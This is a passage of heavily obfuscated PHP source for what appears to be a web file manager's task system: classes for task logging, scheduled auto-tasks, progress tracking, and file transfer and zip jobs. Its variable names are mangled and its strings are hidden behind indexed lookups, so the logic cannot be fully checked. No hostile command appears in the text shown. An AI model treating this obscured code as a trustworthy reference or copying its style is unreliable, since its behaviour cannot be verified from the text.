$º±¾²é˜[$±äÑèêÚ[794]] = $º±¾²é˜[$±äÑèêÚ[794]] == 0 ? $½´€¨èŠ : $º±¾²é˜[$±äÑèêÚ[794]]; $º±¾²é˜[$±äÑèêÚ[1681]] = $ÕÃ¹ÖøÆ; } else { if ($Ö¦ö¶•Ë > 0) { $º±¾²é˜[$±äÑèêÚ[794]] = $º±¾²é˜[$±äÑèêÚ[794]] == 0 ? $ØÖƒï : $º±¾²é˜[$±äÑèêÚ[794]]; $º±¾²é˜[$±äÑèêÚ[1681]] = $Ö¦ö¶•Ë; } } $this->update(); self::log("\160\162\157\147\162\145\163\x73\x48\x74\x74\160\x3a\144\x6f\x77\x6e\72{$Ö¦ö¶•Ë}\x2f{$ØÖƒï}\73\x20\x75\160\154\157\x61\144\x3a{$ÕÃ¹ÖøÆ}\57{$½´€¨èŠ}\x3b"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($Ôµç¢Åù, $´èÄºË• = '', $œğõ­‚… = 0, $€€—ªùÏ = '') { $†‚Š•§ï =& $_SERVER[şÒÁøÒÄ]; $’ö·»š = new Task($Ôµç¢Åù, $´èÄºË•, $œğõ­‚…, $€€—ªùÏ); $GLOBALS[$†‚Š•§ï[1763] . $Ôµç¢Åù] = new TaskLog($†‚Š•§ï[1664], $’ö·»š, $€€—ªùÏ); return $’ö·»š; } public function __construct($è²¶º…¨ = '', $”âõÆ¤ = '', $ØùÖÃõë = '') { $æ£ûš€¤ =& $_SERVER[şÒÁøÒÄ]; if (!$è²¶º…¨) { $è²¶º…¨ = $æ£ûš€¤[1664]; } $†¬…ø»æ = $è²¶º…¨ . $æ£ûš€¤[386] . rand_string(10); if (!$ØùÖÃõë) { $ØùÖÃõë = $è²¶º…¨ . $æ£ûš€¤[53] . $ØùÖÃõë; } switch ($è²¶º…¨) { case $æ£ûš€¤[1664]: if (!$”âõÆ¤ || !$”âõÆ¤->task) { return echoLog($è²¶º…¨ . $æ£ûš€¤[1764]); } $¼Ú ãÌ› = $”âõÆ¤; $†¬…ø»æ = $¼Ú ãÌ›->task[$æ£ûš€¤[399]]; $è²¶º…¨ = $¼Ú ãÌ›->task[$æ£ûš€¤[399]]; if (!$¼Ú ãÌ›->task[$æ£ûš€¤[1580]]) { $¼Ú ãÌ›->task[$æ£ûš€¤[1580]] = $ØùÖÃõë ? $ØùÖÃõë : $è²¶º…¨; } break; case $æ£ûš€¤[1765]: if (!$”âõÆ¤) { return echoLog($è²¶º…¨ . $æ£ûš€¤[1766]); } $¯àÒ‰ Š = is_string($”âõÆ¤) ? array($”âõÆ¤) : $”âõÆ¤; $¼Ú ãÌ› = new TaskFileTransfer($†¬…ø»æ, $è²¶º…¨, 0, $ØùÖÃõë ? $ØùÖÃõë : $¯àÒ‰ Š[0]); foreach ($¯àÒ‰ Š as $‘”ç³Éî) { $¼Ú ãÌ›->addPath($‘”ç³Éî); } break; case $æ£ûš€¤[313]: if (!$”âõÆ¤) { return echoLog($è²¶º…¨ . $æ£ûš€¤[1766]); } $¯àÒ‰ Š = is_string($”âõÆ¤) ? array($”âõÆ¤) : $”âõÆ¤; $¼Ú ãÌ› = new TaskZip($†¬…ø»æ, $è²¶º…¨, 0, $ØùÖÃõë ? $ØùÖÃõë : $¯àÒ‰ Š[0]); foreach ($¯àÒ‰ Š as $‘”ç³Éî) { $¼Ú ãÌ›->addPath($‘”ç³Éî); } break; case $æ£ûš€¤[1227]: if (!$”âõÆ¤) { return echoLog($è²¶º…¨ . $æ£ûš€¤[1766]); } $¼Ú ãÌ› = new TaskUnZip($†¬…ø»æ, $è²¶º…¨, 0, $ØùÖÃõë ? $ØùÖÃõë : $”âõÆ¤); if ($”âõÆ¤) { $¼Ú ãÌ›->addFile($”âõÆ¤); } break; case $æ£ûš€¤[148]: $¼Ú ãÌ› = new TaskHttp($†¬…ø»æ, $è²¶º…¨); break; default: return; break; } $this->task = $¼Ú ãÌ›; $this->taskID = $†¬…ø»æ; Hook::bind($æ£ûš€¤[1701], array($this, $æ£ûš€¤[1767])); Hook::bind($æ£ûš€¤[1703], array($this, $æ£ûš€¤[1768])); Hook::bind($æ£ûš€¤[1697], array($this, $æ£ûš€¤[1769])); echoLog($æ£ûš€¤[1770] . $¼Ú ãÌ›->task[$æ£ûš€¤[1580]]); } public function __destruct() { $this->end(); } public function end($ûïŒ®À¼ = '') { $‚êí²Éß =& $_SERVER[şÒÁøÒÄ]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($ûïŒ®À¼); $this->task = !1; $this->taskID = !1; Hook::unbind($‚êí²Éß[1701], array($this, $‚êí²Éß[1767])); Hook::unbind($‚êí²Éß[1703], array($this, $‚êí²Éß[1768])); Hook::unbind($‚êí²Éß[1697], array($this, $‚êí²Éß[1769])); } public function taskUpdate($×İŒ®­) { $ü´èÅ© =& $_SERVER[şÒÁøÒÄ]; if (!$×İŒ®­ || $this->taskID != $×İŒ®­[$ü´èÅ©[399]]) { return; } $ì‚ú¤¨ñ = 20; $‡£Ë’õ = intval($×İŒ®­[$ü´èÅ©[1682]] * $ì‚ú¤¨ñ); $¡‘›¬úí = $ü´èÅ©[162] . str_repeat($ü´èÅ©[897], $‡£Ë’õ) . $ü´èÅ©[1027] . str_repeat($ü´èÅ©[53], $ì‚ú¤¨ñ - $‡£Ë’õ) . $ü´èÅ©[164]; $ç–¡“°† = $¡‘›¬úí . sprintf($ü´èÅ©[1771], $×İŒ®­[$ü´èÅ©[1682]] * 100) . $ü´èÅ©[1772]; $¼Îä²é = $ç–¡“°† . $×İŒ®­[$ü´èÅ©[1681]] . $ü´èÅ©[8] . $×İŒ®­[$ü´èÅ©[794]] . LNG($ü´èÅ©[1773]); $ƒåÖƒ”Œ = $ü´èÅ©[12]; if ($×İŒ®­[$ü´èÅ©[1757]]) { $¼Îä²é = $ç–¡“°† . size_format($×İŒ®­[$ü´èÅ©[1681]]) . $ü´èÅ©[8] . size_format($×İŒ®­[$ü´èÅ©[794]]); $ƒåÖƒ”Œ = size_format($×İŒ®­[$ü´èÅ©[1683]]) . $ü´èÅ©[1774]; } if ($×İŒ®­[$ü´èÅ©[1077]]) { $×İŒ®­[$ü´èÅ©[1731]] = $×İŒ®­[$ü´èÅ©[1077]] . $ü´èÅ©[53] . $×İŒ®­[$ü´èÅ©[1731]]; } if ($×İŒ®­[$ü´èÅ©[1731]]) { $Ûäçö©œ = $ü´èÅ©[12]; if ($×İŒ®­[$ü´èÅ©[1733]]) { $Ûäçö©œ = $ü´èÅ©[50] . size_format($×İŒ®­[$ü´èÅ©[1734]]) . $ü´èÅ©[8] . size_format($×İŒ®­[$ü´èÅ©[1733]]); } $ƒåÖƒ”Œ .= $×İŒ®­[$ü´èÅ©[1731]] . $Ûäçö©œ; } if ($×İŒ®­[$ü´èÅ©[771]] && !$×İŒ®­[$ü´èÅ©[1733]]) { $ƒåÖƒ”Œ .= $ü´èÅ©[53] . size_format($×İŒ®­[$ü´èÅ©[1738]]) . $ü´èÅ©[8] . size_format($×İŒ®­[$ü´èÅ©[771]]); } echoLog($¼Îä²é . $ü´èÅ©[53] . $ƒåÖƒ”Œ, !0); } public function taskEnd($ÊÙ½°Õ) { $¶± ÑáÆ =& $_SERVER[şÒÁøÒÄ]; if (!$ÊÙ½°Õ || $this->taskID != $ÊÙ½°Õ[$¶± ÑáÆ[399]]) { return; } $œ¯İš = $ÊÙ½°Õ ? $ÊÙ½°Õ[$¶± ÑáÆ[1681]] . $¶± ÑáÆ[8] . $ÊÙ½°Õ[$¶± ÑáÆ[794]] . LNG($¶± ÑáÆ[1773]) . $¶± ÑáÆ[71] : $¶± ÑáÆ[12]; echoLog($¶± ÑáÆ[1775] . $ÊÙ½°Õ[$¶± ÑáÆ[1580]] . ($ÊÙ½°Õ[$¶± ÑáÆ[453]] ? $¶± ÑáÆ[71] . $ÊÙ½°Õ[$¶± ÑáÆ[453]] : $¶± ÑáÆ[12]) . $¶± ÑáÆ[71] . $œ¯İš . $¶± ÑáÆ[1776] . sprintf($¶± ÑáÆ[858], timeFloat() - $ÊÙ½°Õ[$¶± ÑáÆ[1684]]) . $¶± ÑáÆ[1696]); $this->end(); } public function taskKill($ÄÅòá‚ä) { $¨‹ü’ù· =& $_SERVER[şÒÁøÒÄ]; if (!$ÄÅòá‚ä || $this->taskID != $ÄÅòá‚ä[$¨‹ü’ù·[399]]) { return; } echoLog($¨‹ü’ù·[1777] . $ÄÅòá‚ä[$¨‹ü’ù·[1580]]); } } goto FÅÎ‡å‡¶ ; FêÍ¯‚Ñ: class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $ÊÅñû’ü =& $_SERVER[şÒÁøÒÄ]; if (self::valueGet($ÊÅñû’ü[757]) != $ÊÅñû’ü[88]) { return; } if (self::valueGet($ÊÅñû’ü[1639]) == $ÊÅñû’ü[88]) { $â¨Íù¨Î = self::valueGet($ÊÅñû’ü[1640]); if (time() - $â¨Íù¨Î > self::AUTO_RESTART_TIME) { self::restart(); } return; } http_close(); $GLOBALS[$ÊÅñû’ü[1641]] = 1; self::valueSet($ÊÅñû’ü[1639], $ÊÅñû’ü[88]); self::log($ÊÅñû’ü[1642] . ACTION . $ÊÅñû’ü[1643]); Session::$data = array(); Session::$sessionSign = $ÊÅñû’ü[12]; $GLOBALS[$ÊÅñû’ü[494]] = 1; Hook::bind($ÊÅñû’ü[1644], $ÊÅñû’ü[1645]); $³ˆä‹ş = 0; while (!0) { self::cacheClear(); if (self::valueGet($ÊÅñû’ü[757]) != $ÊÅñû’ü[88]) { self::valueSet($ÊÅñû’ü[1639], $ÊÅñû’ü[198]); self::log($ÊÅñû’ü[1646]); die; } $²Ñôƒ© = time(); if ($²Ñôƒ© - $³ˆä‹ş >= 60) { self::valueSet(array($ÊÅñû’ü[1639] => $ÊÅñû’ü[88], $ÊÅñû’ü[1640] => $²Ñôƒ©), !1); $³ˆä‹ş = $²Ñôƒ©; } if (!file_exists(USER_SYSTEM . $ÊÅñû’ü[1647])) { self::valueSet(array($ÊÅñû’ü[1639] => $ÊÅñû’ü[198], $ÊÅñû’ü[757] => $ÊÅñû’ü[198]), !1); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function restart() { $ç½÷º Ş =& $_SERVER[şÒÁøÒÄ]; http_close(); self::valueSet($ç½÷º Ş[757], $ç½÷º Ş[198]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($ç½÷º Ş[1639] => $ç½÷º Ş[198], $ç½÷º Ş[757] => $ç½÷º Ş[88]), !1); } public static function taskSwitch() { $©†˜Ë•‰ =& $_SERVER[şÒÁøÒÄ]; $ø÷ÀöøÙ = self::valueGet($©†˜Ë•‰[757]) == $©†˜Ë•‰[88] ? $©†˜Ë•‰[198] : $©†˜Ë•‰[88]; self::valueSet($©†˜Ë•‰[757], $ø÷ÀöøÙ); } public static function shutdownEvent() { $ÃÚÎé» =& $_SERVER[şÒÁøÒÄ]; self::valueSet($ÃÚÎé»[1639], $ÃÚÎé»[198]); self::log($ÃÚÎé»[1648]); } public static function config($æÅ¨¬Á, $Ñ–É¸¢Ò) { self::valueSet($_SERVER[şÒÁøÒÄ][757], $æÅ¨¬Á); } private static function taskRunAll() { $Ğà•â¤Ì =& $_SERVER[şÒÁøÒÄ]; $®›ÅêŒ = timeFloat(); $‡ãŞê‡Ë = Model($Ğà•â¤Ì[1649])->listData(); $Òˆ”Ôïò = count($‡ãŞê‡Ë); for ($¶Áöı‰Ñ = 0; $¶Áöı‰Ñ < $Òˆ”Ôïò; $¶Áöı‰Ñ++) { $ïÁò“î = $‡ãŞê‡Ë[$¶Áöı‰Ñ]; if (!$ïÁò“î[$Ğà•â¤Ì[399]] || $ïÁò“î[$Ğà•â¤Ì[1650]] != $Ğà•â¤Ì[88]) { continue; } if (!self::taskTimeCheck($ïÁò“î)) { continue; } self::taskRun($ïÁò“î); } Hook::trigger($Ğà•â¤Ì[1651]); self::taskQueueRun($®›ÅêŒ); } private static function taskQueueRun($øÍ­ã‰©) { $š–üØá = 10; while (!0) { $ÍÑª¢—’ = TaskQueue::run(); if ($ÍÑª¢—’ === !1) { break; } if (timeFloat() - $øÍ­ã‰© >= $š–üØá) { break; } } } private static function taskTimeCheck($‘Æ­¤Æ¦) { $‡ØöÈîõ =& $_SERVER[şÒÁøÒÄ]; $‘·ÉÖƒå = json_decode($‘Æ­¤Æ¦[$‡ØöÈîõ[180]], !0); $ÄÌ²Äá— = intval($‘Æ­¤Æ¦[$‡ØöÈîõ[1640]]); $ÓÎÌù×ø = strtotime($‡ØöÈîõ[1652] . $‘·ÉÖƒå[$‡ØöÈîõ[1653]] . $‡ØöÈîõ[1654]) - strtotime($‡ØöÈîõ[1655]); $ÑÆí®Ö = time() - strtotime(date($‡ØöÈîõ[1656]) . $‡ØöÈîõ[1657]); $…šßñ¦ = $ÑÆí®Ö >= $ÓÎÌù×ø && $ÑÆí®Ö <= $ÓÎÌù×ø + 3600; switch ($‘·ÉÖƒå[$‡ØöÈîõ[33]]) { case $‡ØöÈîõ[1658]: if (time() - $ÄÌ²Äá— < 3600 * 24 * 30) { return !1; } if ($‘·ÉÖƒå[$‡ØöÈîõ[1658]] == date($‡ØöÈîõ[1659]) && $…šßñ¦) { return !0; } break; case $‡ØöÈîõ[1660]: if (time() - $ÄÌ²Äá— < 3600 * 24 * 7) { return !1; } $¥²è™ = date($‡ØöÈîõ[1661]) == 0 ? 7 : date($‡ØöÈîõ[1661]); if ($‘·ÉÖƒå[$‡ØöÈîõ[1660]] == $¥²è™ && $…šßñ¦) { return !0; } break; case $‡ØöÈîõ[1653]: if (time() - $ÄÌ²Äá— < 3600 * 24) { return !1; } if ($…šßñ¦) { return !0; } break; case $‡ØöÈîõ[1662]: if (time() - $ÄÌ²Äá— >= floatval($‘·ÉÖƒå[$‡ØöÈîõ[1662]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $°™”Ü¼å =& $_SERVER[şÒÁøÒÄ]; static $—ğú¶Õ˜ = 0; $ßñ€œÙ = 300; if (!$—ğú¶Õ˜) { $—ğú¶Õ˜ = time(); } if (time() - $—ğú¶Õ˜ < $ßñ€œÙ) { return; } $—ğú¶Õ˜ = time(); $¾ÆªÁõè = Model($°™”Ü¼å[504])->db($°™”Ü¼å[12]); if ($¾ÆªÁõè) { $¾ÆªÁõè->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($°™”Ü¼å[1663], $°™”Ü¼å[1664]); die; } } public static function taskRun($ÆßŒ‚òû) { $¡»Å†ää =& $_SERVER[şÒÁøÒÄ]; self::log($¡»Å†ää[1665] . $ÆßŒ‚òû[$¡»Å†ää[399]] . $¡»Å†ää[1666] . $ÆßŒ‚òû[$¡»Å†ää[32]] . $¡»Å†ää[1667] . $ÆßŒ‚òû[$¡»Å†ää[1668]]); Model($¡»Å†ää[1649])->run($ÆßŒ‚òû[$¡»Å†ää[399]]); $·š“î± = timeFloat(); $ò»œ»©ê = $¡»Å†ää[12]; switch ($ÆßŒ‚òû[$¡»Å†ää[33]]) { case $¡»Å†ää[307]: $İšäšĞ = url_request($ÆßŒ‚òû[$¡»Å†ää[1668]], $¡»Å†ää[230], !1, !1, !1, !1, 10); if ($İšäšĞ[$¡»Å†ää[757]]) { $ò»œ»©ê = strlen($İšäšĞ[$¡»Å†ää[1215]]); } break; case $¡»Å†ää[229]: $ò»œ»©ê = Hook::apply($ÆßŒ‚òû[$¡»Å†ää[1668]]); default: break; } Model($¡»Å†ää[1669])->add(array($¡»Å†ää[1670] => $¡»Å†ää[12], $¡»Å†ää[1671] => $¡»Å†ää[198], $¡»Å†ää[33] => $¡»Å†ää[1672] . $ÆßŒ‚òû[$¡»Å†ää[399]], $¡»Å†ää[1673] => json_encode(array($¡»Å†ää[32] => $ÆßŒ‚òû[$¡»Å†ää[32]], $¡»Å†ää[1674] => timeFloat() - $·š“î±, $¡»Å†ää[293] => $ò»œ»©ê)))); $®ÀÒ®Ş¦ = $ò»œ»©ê ? $¡»Å†ää[1675] . $ò»œ»©ê : $¡»Å†ää[12]; self::log($¡»Å†ää[1676] . $ÆßŒ‚òû[$¡»Å†ää[399]] . $¡»Å†ää[164] . $®ÀÒ®Ş¦); return !0; } private static function valueGet($§º…ò÷Ú) { $Úö Óæ =& $_SERVER[şÒÁøÒÄ]; $€ÓÇ¯µğ = $Úö Óæ[1677]; $ÌÔ­¥³Ø = Model($Úö Óæ[435])->get($§º…ò÷Ú, $€ÓÇ¯µğ); if (is_null($ÌÔ­¥³Ø)) { Model($Úö Óæ[435])->set($Úö Óæ[757], $Úö Óæ[88], $€ÓÇ¯µğ); Model($Úö Óæ[435])->set($Úö Óæ[1639], $Úö Óæ[198], $€ÓÇ¯µğ); $ÌÔ­¥³Ø = Model($Úö Óæ[435])->get($§º…ò÷Ú, $€ÓÇ¯µğ); } return $ÌÔ­¥³Ø; } private static function valueSet($”ô…ÕÈ, $Ÿîí¦¹) { $­“Ñ©Ä =& $_SERVER[şÒÁøÒÄ]; $‡¼†ô©ø = $­“Ñ©Ä[1678]; CacheLock::lock($‡¼†ô©ø); $°Ã»øÔ = Model($­“Ñ©Ä[435])->set($”ô…ÕÈ, $Ÿîí¦¹, $­“Ñ©Ä[1677]); CacheLock::unlock($‡¼†ô©ø); return $°Ã»øÔ; } protected static function log($ÑÓ¨§ªÔ) { write_log($ÑÓ¨§ªÔ, $_SERVER[şÒÁøÒÄ][1664]); } private static function cacheClear() { $©¾»§´Ç =& $_SERVER[şÒÁøÒÄ]; Cache::clearMemory(Model($©¾»§´Ç[435])->cacheKey($©¾»§´Ç[1677])); Cache::clearMemory(Model($©¾»§´Ç[435])->cacheKey($©¾»§´Ç[1679])); Model($©¾»§´Ç[1649])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\163\x74\157\160"; const STATYS_RUNNING = "\x72\x75\156\156\x69\156\x67"; const STATYS_KILL = "\153\151\x6c\x6c"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($¤£ñÚş‡, $ÎşØü„’ = '', $’ÖÆ¬ğ = 0, $é­˜†ìñ = '') { $‹§Ú”ôÙ =& $_SERVER[şÒÁøÒÄ]; if (self::get($¤£ñÚş‡)) { return; } $this->task = array($‹§Ú”ôÙ[399] => $¤£ñÚş‡, $‹§Ú”ôÙ[1680] => USER_ID, $‹§Ú”ôÙ[1580] => $é­˜†ìñ, $‹§Ú”ôÙ[453] => $‹§Ú”ôÙ[12], $‹§Ú”ôÙ[33] => $ÎşØü„’, $‹§Ú”ôÙ[1077] => $‹§Ú”ôÙ[12], $‹§Ú”ôÙ[794] => $’ÖÆ¬ğ, $‹§Ú”ôÙ[1681] => 0, $‹§Ú”ôÙ[1682] => 0, $‹§Ú”ôÙ[1683] => 0, $‹§Ú”ôÙ[1684] => timeFloat(), $‹§Ú”ôÙ[1685] => 0, $‹§Ú”ôÙ[1686] => 0, $‹§Ú”ôÙ[1687] => 0, $‹§Ú”ôÙ[1688] => 0, $‹§Ú”ôÙ[757] => $‹§Ú”ôÙ[1639]); $GLOBALS[$‹§Ú”ôÙ[1689]] = 1; Hook::bind($‹§Ú”ôÙ[1644], array($this, $‹§Ú”ôÙ[1690])); Hook::bind($‹§Ú”ôÙ[1691], array($this, $‹§Ú”ôÙ[1692])); $this->startAfter(); Hook::trigger($‹§Ú”ôÙ[1693], $this->task); $this->task[$‹§Ú”ôÙ[1686]] = timeFloat(); } public function end($»•¬š½ = '') { $ÓÍœò™Ö =& $_SERVER[şÒÁøÒÄ]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$ÓÍœò™Ö[1686]]) { self::valueSet($this->task[$ÓÍœò™Ö[399]], !1); } $this->isEnd = !0; if ($»•¬š½) { $this->task[$ÓÍœò™Ö[453]] = $»•¬š½; } self::log($ÓÍœò™Ö[1694] . $this->task[$ÓÍœò™Ö[399]] . $ÓÍœò™Ö[1695] . sprintf($ÓÍœò™Ö[858], timeFloat() - $this->task[$ÓÍœò™Ö[1684]]) . $ÓÍœò™Ö[1696]); Hook::unbind($ÓÍœò™Ö[1644], array($this, $ÓÍœò™Ö[1690])); Hook::unbind($ÓÍœò™Ö[1691], array($this, $ÓÍœò™Ö[1692])); $this->endAfter(); $–Á‚ùĞ = $this->task; $this->task = !1; Hook::trigger($ÓÍœò™Ö[1697], $–Á‚ùĞ); } public function update($œÁìæ®ß = 0, $İ˜Ø¢å— = false) { $—³šÊÈ¿ =& $_SERVER[şÒÁøÒÄ]; $õ¸Üã§Ë =& $this->task; if (!$õ¸Üã§Ë) { return; } $õ¸Üã§Ë[$—³šÊÈ¿[1681]] += $œÁìæ®ß; $õ¸Üã§Ë[$—³šÊÈ¿[1685]] = timeFloat(); if ($õ¸Üã§Ë[$—³šÊÈ¿[794]]) { if ($õ¸Üã§Ë[$—³šÊÈ¿[794]] < $õ¸Üã§Ë[$—³šÊÈ¿[1681]]) { $õ¸Üã§Ë[$—³šÊÈ¿[794]] = $õ¸Üã§Ë[$—³šÊÈ¿[1681]]; } $Ë¡à–£š = timeFloat() - $õ¸Üã§Ë[$—³šÊÈ¿[1684]] - $õ¸Üã§Ë[$—³šÊÈ¿[1687]]; if ($Ë¡à–£š <= 0) { $Ë¡à–£š = 0.001; } $õ¸Üã§Ë[$—³šÊÈ¿[1682]] = $õ¸Üã§Ë[$—³šÊÈ¿[1681]] / $õ¸Üã§Ë[$—³šÊÈ¿[794]]; $õ¸Üã§Ë[$—³šÊÈ¿[1683]] = $õ¸Üã§Ë[$—³šÊÈ¿[1681]] / $Ë¡à–£š; if ($õ¸Üã§Ë[$—³šÊÈ¿[1682]] > 0) { $õ¸Üã§Ë[$—³šÊÈ¿[1688]] = $Ë¡à–£š * (1 - $õ¸Üã§Ë[$—³šÊÈ¿[1682]]) / $õ¸Üã§Ë[$—³šÊÈ¿[1682]]; } $õ¸Üã§Ë[$—³šÊÈ¿[1688]] = $õ¸Üã§Ë[$—³šÊÈ¿[1688]] <= 0 ? 0 : $õ¸Üã§Ë[$—³šÊÈ¿[1688]]; } $this->updateAfter(); $¨ğ»¿ã½ = 0.2; if (timeFloat() - $õ¸Üã§Ë[$—³šÊÈ¿[1686]] < $¨ğ»¿ã½ && !$İ˜Ø¢å—) { return; } $ÙÃÍ­á = self::get($õ¸Üã§Ë[$—³šÊÈ¿[399]]); $óæ±„› = $ÙÃÍ­á[$—³šÊÈ¿[757]]; if ($óæ±„› == self::STATYS_KILL) { $ë˜ñ–şù = array($—³šÊÈ¿[1698] => LNG($—³šÊÈ¿[1699]), $—³šÊÈ¿[1225] => !1); Cache::set($—³šÊÈ¿[1700] . $this->task[$—³šÊÈ¿[399]], $ë˜ñ–şù, 30); $this->onKill(); $this->end(); die; } else { if ($óæ±„› == self::STATYS_STOP) { $æšËåŒÃ = 2; $ÙÃÍ­á[$—³šÊÈ¿[1687]] += $æšËåŒÃ; self::valueSet($õ¸Üã§Ë[$—³šÊÈ¿[399]], $ÙÃÍ­á); sleep($æšËåŒÃ); $this->update(); return; } } $õ¸Üã§Ë[$—³šÊÈ¿[757]] = $óæ±„› ? $óæ±„› : $õ¸Üã§Ë[$—³šÊÈ¿[757]]; $õ¸Üã§Ë[$—³šÊÈ¿[1687]] = $ÙÃÍ­á[$—³šÊÈ¿[1687]] ? $ÙÃÍ­á[$—³šÊÈ¿[1687]] : 0; $õ¸Üã§Ë[$—³šÊÈ¿[1686]] = timeFloat(); Hook::trigger($—³šÊÈ¿[1701], $õ¸Üã§Ë); self::valueSet($õ¸Üã§Ë[$—³šÊÈ¿[399]], $õ¸Üã§Ë); } public function onKillSet($Æ¤ş™‡–, $şó…Õ…ê = array()) { $this->onKillCall = array($Æ¤ş™‡–, $şó…Õ…ê); } public function onKill() { $¦Á…¹ê =& $_SERVER[şÒÁøÒÄ]; self::log($¦Á…¹ê[1694] . $this->task[$¦Á…¹ê[399]] . $¦Á…¹ê[1702]); Hook::trigger($¦Á…¹ê[1703], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($ô÷é»Ïü) { $Ç´‹¼˜Ò =& $_SERVER[şÒÁøÒÄ]; Cache::set($Ç´‹¼˜Ò[1700] . $this->task[$Ç´‹¼˜Ò[399]], $ô÷é»Ïü, 60); return $ô÷é»Ïü; } public static function get($£˜ïÏ¨) { $“‚íÛãø =& $_SERVER[şÒÁøÒÄ]; $˜‚Ú­½í = self::valueGet($£˜ïÏ¨); if (is_array($˜‚Ú­½í) && $˜‚Ú­½í[$“‚íÛãø[1704]]) { $š“ÇÑˆµ = ActionApply($˜‚Ú­½í[$“‚íÛãø[1704]], array($˜‚Ú­½í)); $˜‚Ú­½í = is_array($š“ÇÑˆµ) ? $š“ÇÑˆµ : $˜‚Ú­½í; } return $˜‚Ú­½í; } public static function listData() { $¿³¿Í» = self::valueGet(); return array_sort_by($¿³¿Í», $_SERVER[şÒÁøÒÄ][1684], !0); } public static function kill($ş‰ğôÒİ) { return self::changeStatus($ş‰ğôÒİ, self::STATYS_KILL); } public static function stop($†ô¯¹•Ÿ) { return self::changeStatus($†ô¯¹•Ÿ, self::STATYS_STOP); } public static function restart($şØ…Óø) { return self::changeStatus($şØ…Óø, self::STATYS_RUNNING); } public static function killAll() { $á”äí¹‰ =& $_SERVER[şÒÁøÒÄ]; $˜‚í¸¶ = self::listData(); foreach ($˜‚í¸¶ as $’“û’Ğ—) { self::kill($’“û’Ğ—[$á”äí¹‰[399]]); } sleep(2); foreach ($˜‚í¸¶ as $’“û’Ğ—) { self::valueSet($’“û’Ğ—[$á”äí¹‰[399]], !1); } } private static function changeStatus($¤ıìªâõ, $æÎÂ¤„) { $íã’Àâ´ =& $_SERVER[şÒÁøÒÄ]; $¡öŞÒ…÷ = self::valueGet($¤ıìªâõ); if (!$¡öŞÒ…÷) { return !1; } $¡öŞÒ…÷[$íã’Àâ´[757]] = $æÎÂ¤„; self::valueSet($¤ıìªâõ, $¡öŞÒ…÷); self::log($íã’Àâ´[1705] . $¡öŞÒ…÷[$íã’Àâ´[399]] . $íã’Àâ´[1706] . $æÎÂ¤„); return !0; } public static function valueGet($¡£ĞæÆ = false) { $Å÷ò¸Á =& $_SERVER[şÒÁøÒÄ]; if ($¡£ĞæÆ) { $ƒÈˆ ùõ = Model($Å÷ò¸Á[447])->where(array($Å÷ò¸Á[94] => $¡£ĞæÆ, $Å÷ò¸Á[33] => $Å÷ò¸Á[1084]))->find(); return $ƒÈˆ ùõ ? json_decode($ƒÈˆ ùõ[$Å÷ò¸Á[374]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($šñŒêœµ = false) { $ƒÆÒ“õ† =& $_SERVER[şÒÁøÒÄ]; $í¡«Àş¿ = array($ƒÆÒ“õ†[33] => $ƒÆÒ“õ†[1084]); if ($šñŒêœµ) { $í¡«Àş¿[$ƒÆÒ“õ†[1680]] = $šñŒêœµ; } $¥îÏÅÉ¦ = Model($ƒÆÒ“õ†[447])->where($í¡«Àş¿)->select(); $¥îÏÅÉ¦ = $¥îÏÅÉ¦ ? $¥îÏÅÉ¦ : array(); foreach ($¥îÏÅÉ¦ as $õé¾‚ù => $Î‡õî‚) { $¥îÏÅÉ¦[$õé¾‚ù] = json_decode($Î‡õî‚[$ƒÆÒ“õ†[374]], !0); } return $¥îÏÅÉ¦; } public static function valueSet($ì™ å„¡, $Ş„Üï¹) { $¸’¼ŸÈö =& $_SERVER[şÒÁøÒÄ]; if (!$Ş„Üï¹) { return Model($¸’¼ŸÈö[447])->where(array($¸’¼ŸÈö[94] => $ì™ å„¡, $¸’¼ŸÈö[33] => $¸’¼ŸÈö[1084]))->delete(); } $•ÈîÏì¢ = json_encode($Ş„Üï¹); if (!$•ÈîÏì¢) { ob_start(); var_dump($Ş„Üï¹); $à¦ĞÅÕ = ob_get_clean(); self::log($¸’¼ŸÈö[1707] . json_encode_force($à¦ĞÅÕ)); } if (!$ì™ å„¡ || !$Ş„Üï¹[$¸’¼ŸÈö[399]]) { return !1; } $›ôéË = array($¸’¼ŸÈö[33] => $¸’¼ŸÈö[1084], $¸’¼ŸÈö[1680] => USER_ID, $¸’¼ŸÈö[94] => $ì™ å„¡, $¸’¼ŸÈö[374] => $•ÈîÏì¢); $£¨±ÑÖÑ = $¸’¼ŸÈö[1708]; CacheLock::lock($£¨±ÑÖÑ); Model($¸’¼ŸÈö[447])->add($›ôéË, array(), !0); CacheLock::unlock($£¨±ÑÖÑ); } public static function log($ƒë“í™œ) { if (!GLOBAL_DEBUG) { return; } write_log($ƒë“í™œ, $_SERVER[şÒÁøÒÄ][1709]); } } class TaskFileTransfer extends Task { protected function startAfter() { $Ÿ¢€ê´ˆ =& $_SERVER[şÒÁøÒÄ]; $¯µ×Ù¥‘ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($Ÿ¢€ê´ˆ[1710], array($this, $Ÿ¢€ê´ˆ[1711])); Hook::bind($Ÿ¢€ê´ˆ[1236], array($this, $Ÿ¢€ê´ˆ[1712])); Hook::bind($Ÿ¢€ê´ˆ[1713], array($this, $Ÿ¢€ê´ˆ[1714])); Hook::bind($Ÿ¢€ê´ˆ[596], array($this, $Ÿ¢€ê´ˆ[1715])); Hook::bind($Ÿ¢€ê´ˆ[597], array($this, $Ÿ¢€ê´ˆ[1716])); Hook::bind($Ÿ¢€ê´ˆ[602], array($this, $Ÿ¢€ê´ˆ[1717])); Hook::bind($Ÿ¢€ê´ˆ[603], array($this, 